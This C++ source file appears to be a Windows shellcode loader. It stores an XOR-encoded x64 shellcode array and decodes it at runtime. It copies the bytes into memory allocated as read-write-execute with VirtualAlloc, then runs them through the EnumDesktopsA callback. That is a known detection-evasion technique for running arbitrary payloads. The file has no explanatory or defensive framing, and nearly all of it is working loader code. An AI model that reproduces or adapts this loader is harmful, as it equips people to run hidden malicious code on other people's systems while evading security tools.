#include <iostream>
#include <conio.h>
#include <iomanip>
#include <windows.h>
#include "Shellcode.h"

using namespace std;



unsigned char my_payload[] = "\xf6\x42\x8b\xee\xfa\xf5\xf5\xf5\xe2\xda\xa\xa\xa\x4b\x5b\x4b\x5a\x58\x5b\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x34\x42\x81\x58\x12\x34\x42\x81\x58\x2a\x34\x42\x81\x78\x5a\x34\x42\x5\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca\xa6\x36\x6b\x76\x8\x26\x2a\x4b\xcb\xc3\x7\x4b\xb\xcb\xe8\xe7\x58\x4b\x5b\x34\x42\x81\x58\x2a\x34\x81\x48\x36\x42\xb\xda\x34\x81\x8a\x82\xa\xa\xa\x42\x8f\xca\x7e\x65\x42\xb\xda\x5a\x34\x81\x42\x12\x34\x4e\x81\x4a\x2a\x43\xb\xda\xe9\x56\x42\xf5\xc3\x34\x4b\x81\x3e\x82\x42\xb\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x7\x4b\xb\xcb\x32\xea\x7f\xfb\x34\x46\x9\x46\x2e\x2\x4f\x33\xdb\x7f\xdc\x52\x34\x4e\x81\x4a\x2e\x43\xb\xda\x6c\x34\x4b\x81\x6\x42\x34\x4e\x81\x4a\x16\x43\xb\xda\x34\x4b\x81\xe\x82\x42\xb\xda\x4b\x52\x4b\x52\x54\x53\x50\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b\x53\x50\x34\x42\x81\x18\xe3\x43\xf5\xf5\xf5\x57\x43\xcd\xcb\xa\xa\xa\xa\x34\x42\x87\x9f\x10\xb\xa\xa\x34\x46\x87\x8f\x2f\xb\xa\xa\x42\x3b\xc3\x4b\xb0\x4f\x89\x5c\xd\xf5\xdf\xb1\xea\x17\x20\x0\x4b\xb0\xac\x9f\xb7\x97\xf5\xdf\x42\x89\xce\x22\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x53\x4b\x83\xd0\xf5\xdf\x47\x6f\x65\x7d\x27\x67\x6f\x65\x7d\x2b\xa\x37\x54\x24\x24\x54\x37\xa\xa";

int main(int argc, char* argv[]) {
    unsigned char key = 0x0A;
    int len = sizeof(my_payload);

    Shellcode sc(my_payload,len);
    sc.XOR_encrypt(key);

    getch();
    cout<<"\n\n\n"; 

    sc.XOR_decrypt(key);


    getch();
    
    LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(mem, my_payload, sizeof(my_payload));
    EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
    return 0; 
}
